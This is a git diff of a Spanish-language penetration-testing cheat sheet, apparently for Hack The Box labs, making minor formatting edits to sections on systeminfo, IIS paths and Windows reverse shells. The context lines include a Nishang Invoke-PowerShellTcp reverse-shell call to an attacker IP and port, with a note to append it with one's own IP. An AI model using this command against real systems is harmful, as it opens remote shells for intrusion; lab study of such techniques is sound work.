@@ -763,8 +763,8 @@ Saber la arquitectura del sistema con "systeminfo"
 ```
 systeminfo
 ```
-![image](https://github.com/gecr07/Acordeon/assets/63270579/9b123cd6-ed32-42b4-a551-26731068ad4c)
 
+![image](https://github.com/gecr07/Acordeon/assets/63270579/9b123cd6-ed32-42b4-a551-26731068ad4c)
 
 
 ## IIS 
@@ -772,7 +772,7 @@ systeminfo
 Las rutas de un IIS son
 
 ````
-
+Prueba
 ```
 
 ## Reverse shell for windows
@@ -781,11 +781,11 @@ Las rutas de un IIS son
 
 > https://github.com/samratashok/nishang
 
- Nishang (via Invoke-PowerShellTcp.ps1)
+###  Nishang (via Invoke-PowerShellTcp.ps1)
 
 ![image](https://github.com/gecr07/Devel-HTB/assets/63270579/c1c683b6-fb64-4ff5-990c-a081247f9564)
 
-Entonces ponemos es linea hasta abajo del archivo con nuestra IP
+Entonces ponemos es linea hasta abajo del archivo con nuestra IP:
 
 ```powershell
 
@@ -917,7 +917,6 @@ https://github.com/samratashok/nishang
 }
 
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444
-
 
 ```
 
